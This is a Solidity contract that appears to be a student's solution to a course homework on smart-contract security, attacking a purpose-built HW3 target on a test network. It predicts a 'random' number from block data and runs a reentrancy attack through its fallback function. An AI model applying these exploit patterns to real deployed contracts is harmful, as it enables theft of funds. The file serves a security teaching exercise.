pragma solidity ^0.4.21;

contract HW3{
    function callMeFirst(string studentID) public;
    function bribeMe(string studentID) public payable;
    function guessRandomNumber(string studentID, uint16 numberGuessed) public;
    function reentry(string studentID) public;
    function flashloan(uint256 amount) public;
    function bonus_verify(string studentID) public;
    function getScore(string studentID) view public returns (uint);
    function getSolvedStatus(string studentID) view public returns (bool[]);
    function setTokenAddr(address CNS_addr) public;
    
}


contract cnshw3{
    HW3 hw3;
    string ID;
    uint16 flag;
    uint score;
    uint16 c2guess;
    constructor (address addr) public payable{
        hw3 = HW3(addr);
        ID = "b07902116";
        score = 0;
        flag = 0;
    }
    
    // Challenge 0
    function callMeFirst() public {
        hw3.callMeFirst(ID);
    }
    
    // Challenge 1
    function bribeMe() public payable{
        hw3.bribeMe.value(1 ether)(ID);
    }

    // Challenge 2
    function guessRandomNumber() public{
        // take needed info from https://kovan.etherscan.io/block/24804001
        bytes32 parenthash = 0x81c15cd7ceb8bc751defd97e99ac2f4d6cdf91cefe224466952c65e06a73434f;
        uint time = 1620856964;
        c2guess = uint16(keccak256(parenthash, time));
        hw3.guessRandomNumber(ID, c2guess);
    }
    
    // Challenge 3
    function () public payable{
        if (flag < 2){
            flag += 1;
            HW3(msg.sender).reentry(ID);
            return;
        }
    }
    
    function reentry() public returns (uint16){
        flag += 1;
        hw3.reentry(ID);
        flag = 0;
    }
    

    
    // Check
    function getScore() view public returns (uint){
        return hw3.getScore(ID);
    }
    
    function getSolvedStatus() view public returns (bool[]){
        return hw3.getSolvedStatus(ID);
    }
}
